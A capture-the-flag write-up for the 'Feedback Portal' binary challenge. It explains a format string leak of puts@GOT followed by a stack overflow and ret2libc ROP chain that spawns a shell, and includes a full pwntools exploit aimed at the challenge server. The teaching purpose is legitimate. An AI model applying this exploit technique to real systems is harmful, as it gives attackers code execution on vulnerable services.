## Feedback Portal - Format String Vulnerability, BOF and ret2libc


### Challenge Overview: Binary Analysis and Attack Surface

The Feedback Portal binary presents a deceptively compact attack surface compressed into a single vulnerable function, `vuln()`. Before touching any payload, the analyst must enumerate binary protections to understand what mitigations constrain the exploit. Running `checksec` against the binary typically reveals the following profile for this challenge: **No PIE** (the binary's code and GOT sections load at fixed, predictable virtual addresses), **NX enabled** (the stack is non-executable, ruling out classic shellcode injection), and a **partial RELRO** configuration (the Global Offset Table remains writable at runtime). The absence of a stack canary is equally important, since it means the overflowed return address will not be detected before the function returns.

The Dockerfile confirms the remote environment is Ubuntu 24.04, and a custom `libc.so.6` is shipped alongside the binary. This is a strong signal that the remote libc version differs from a typical analyst's local installation, making it essential to work against the provided library rather than the system one.

The C source reduces to the following:

```c
static void vuln(void) {
    char name[64];
    char feedback[64];

    puts("=== Feedback Portal ===");
    puts("Please enter your name:");

    if (!fgets(name, sizeof(name), stdin))
        exit(1);

    printf("Hello, ");
    printf(name);              // [1] format string vulnerability

    puts("\nNow leave your feedback:");

    read(STDIN_FILENO, feedback, 256);  // [2] stack buffer overflow
}
```

Two independent vulnerabilities exist in sequence: a **format string vulnerability** at `[1]`, followed immediately by a **stack buffer overflow** at `[2]`. This pairing is deliberate and constitutes a classic two-stage exploit primitive: the format string leaks a runtime address needed to bypass ASLR, and the overflow delivers the ROP chain.

### Vulnerability Analysis

#### The Format String Vulnerability

The call `printf(name)` passes a user-controlled buffer directly as the format string argument, with no interposing format specifier such as `%s`. In standard C, this is undefined behavior. In practice, the x86-64 calling convention defines how `printf` resolves format specifiers: after exhausting the six integer register arguments (`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`), it walks up the stack to satisfy additional conversion specifications. A format string like `%14$p` therefore reads the 14th argument to `printf` from the stack frame, which at the time of the call corresponds to a value at a fixed offset from `rsp`.

The `name` buffer itself is allocated on the stack, meaning an attacker can append a 64-bit address to the payload and then reference it with a direct-parameter-access specifier such as `%15$s`. The `%s` conversion dereferences the value at that argument position as a pointer and prints the null-terminated string it finds there — in effect, an arbitrary read primitive at any address the attacker supplies.

The exploit uses index 15 (written in the script as `PRINTF_INPUT_IDX + 1`), calculated empirically by observing where the `name` buffer's content appears relative to `printf`'s argument vector on the stack.

#### The Stack Buffer Overflow

The `feedback` buffer is declared as 64 bytes. The `read()` call, however, accepts up to 256 bytes. On x86-64, the saved return address of `vuln` sits at a fixed offset from the base of the `feedback` array. Using a De Bruijn cyclic sequence (`cyclic(200)`) and inspecting the resulting core dump, the offset to the return address (`RIP`) is determined to be **136 bytes**. Any payload that places 136 bytes of padding before a crafted 8-byte value will overwrite the return address with that value when `vuln` returns.

> **Key insight:** ASLR randomizes the base address of libc at every execution. The format string vulnerability resolves this by leaking the _runtime_ address of a known libc symbol before the overflow stage is reached, allowing the ROP chain to be constructed with absolute addresses computed on the fly.

### Exploit Strategy: Two-Stage ROP

The complete exploit proceeds in two distinct phases within a single connection.

#### Stage 1 — Leaking the libc Base Address

Because PIE is disabled, the **Global Offset Table** (GOT) entry for `puts` resides at a known, static virtual address throughout the binary's lifetime: `elf.got['puts']`. At runtime, the dynamic linker resolves lazy-bound symbols and writes the _actual libc address_ of `puts` into this GOT slot. Reading those 8 bytes reveals both the runtime address of `puts` and, by subtraction, the libc base.

The format string payload is constructed as follows:

```python
r.sendline(f"%{PRINTF_INPUT_IDX + 1}$sAAA".encode() + p64(PUTS_GOT))
```

This payload places the `%15$s` specifier at the beginning of the string, followed by the ASCII sentinel `AAA`, followed by the 8-byte little-endian encoding of the GOT address. When `printf` processes the format string, the `%15$s` argument resolves to the pointer sitting at the 15th stack position from `printf`'s perspective — which corresponds to the `p64(PUTS_GOT)` value appended at the end of the buffer. `printf` then dereferences that address and prints the 8-byte content of the GOT entry as a string.

> **Important:** `printf(name)` stops reading the format string when it encounters a null byte. Placing `p64(PUTS_GOT)` _before_ the format string specifier would therefore cause `printf` to halt at the null bytes in the address before ever reaching the specifier. The format string must come first.

After stripping the `Hello,` prefix and the `AAA` delimiter, the leak is extracted, zero-padded to 8 bytes, and unpacked with `u64()`:

```python
leak = r.recvline().strip().split(b"AAA")[0].split(b"Hello, ")[1]
puts_leak_addr = u64(leak.ljust(8, b'\x00'))

base = puts_leak_addr - libc.symbols['puts']
libc.address = base
```

With `libc.address` set, pwntools automatically rebases all symbol lookups. The addresses of `system`, `/bin/sh`, and the `pop rdi; ret` gadget can now be computed at their true runtime locations.

#### Stage 2 — ROP Chain to `system("/bin/sh")`

With no `pop rdi; ret` gadget present in the binary itself (a consequence of the minimal compiled code), the gadget is sourced from libc:

```python
pop_rdi_ret_addr = ROP(libc).find_gadget(['pop rdi', 'ret'])[0]
binsh_addr       = next(libc.search(b'/bin/sh\x00'))
system_addr      = libc.symbols['system']
```

The ROP chain is laid out as follows:

```
[ 136 bytes padding ]
[ ret gadget         ]   ← stack alignment (16-byte ABI requirement)
[ pop rdi; ret       ]   ← load first argument register
[ /bin/sh address    ]   ← rdi = pointer to "/bin/sh"
[ system address     ]   ← call system("/bin/sh")
```

The leading `ret` gadget is required because `system()` in glibc performs SSE operations that require the stack to be 16-byte aligned at the point of the `call`. Without the extra `ret`, the stack pointer would be misaligned by 8 bytes upon entering `system`, causing a SIGSEGV from a `movaps` instruction before any shell code executes.

The final payload is assembled and sent:

```python
stage2 = flat(
    b'A' * OFFSET_TO_RIP,
    p64(ret_gadget),
    p64(pop_rdi_ret_addr),
    p64(binsh_addr),
    p64(system_addr),
)
r.send(stage2)
r.interactive()
```

### Stack Layout Reference

The memory layout during the `vuln` stack frame clarifies why the offsets are what they are.

```
Higher addresses (toward main's frame)
┌─────────────────────────────────────┐
│  Saved RIP (return address)         │  ← overwritten at offset 136
├─────────────────────────────────────┤
│  Saved RBP                          │  ← 8 bytes
├─────────────────────────────────────┤
│  name[0..63]       (64 bytes)       │  ← fgets writes here; printf reads here
├─────────────────────────────────────┤
│  feedback[0..63]   (64 bytes)       │  ← read() writes up to 256 bytes here
│  ...               (padding)        │
└─────────────────────────────────────┘
Lower addresses (stack grows downward)
```

The 136-byte offset from the base of `feedback` to the saved `RIP` accounts for the 64-byte `feedback` array, 8 bytes of saved `RBP`, and an additional 64-byte `name` buffer above it on the stack (64 + 8 + 64 = 136).

### Full Annotated Exploit

```python
#!/usr/bin/env python3
from pwn import *

ADDR = "offsec.m0lecon.it"
PORT = 13600

context.binary = elf = ELF('./feedback_portal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(ADDR, PORT)
    return r

# --- Constants ---
OFFSET_TO_RIP  = 136          # offset from feedback[] base to saved RIP
PRINTF_IDX     = 14           # base index of name buffer on printf's stack
PUTS_GOT       = elf.got['puts']   # fixed address (no PIE)

rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]

r = conn()

# ── Stage 1: Format string leak ──────────────────────────────────────────────
r.recvuntil(b"name:\n")
# %15$s dereferences the GOT pointer appended at the end of the buffer
r.sendline(f"%{PRINTF_IDX + 1}$sAAA".encode() + p64(PUTS_GOT))

leak = r.recvline().strip().split(b"AAA")[0].split(b"Hello, ")[1]
puts_addr = u64(leak.ljust(8, b'\x00'))
log.info(f"puts @ {puts_addr:#x}")

libc.address = puts_addr - libc.symbols['puts']
log.info(f"libc base @ {libc.address:#x}")

# ── Stage 2: ROP chain → system("/bin/sh") ───────────────────────────────────
pop_rdi = ROP(libc).find_gadget(['pop rdi', 'ret'])[0]
binsh   = next(libc.search(b'/bin/sh\x00'))
system  = libc.symbols['system']

r.recvuntil(b'feedback:\n')
payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(ret_gadget),     # stack alignment
    p64(pop_rdi),        # pop rdi; ret
    p64(binsh),          # rdi = "/bin/sh"
    p64(system),         # system("/bin/sh")
)
r.send(payload)
r.interactive()
```

### Key Takeaways

> A format string vulnerability that allows arbitrary memory reads and a stack buffer overflow that allows arbitrary control-flow hijacking, appearing in sequence within the same function, form one of the most well-studied two-stage exploit primitives in binary exploitation. The format string resolves the ASLR problem; the overflow delivers execution.

The challenge reinforces several fundamental principles of modern binary exploitation: the necessity of leaking a runtime address before constructing any ASLR-dependent payload, the mechanism by which direct-parameter-access format specifiers enable targeted memory reads, the role of the `ret` gadget in maintaining stack alignment for SSE-using libc functions, and the critical importance of sourcing ROP gadgets and the `/bin/sh` string from the _provided_ libc rather than the analyst's local copy.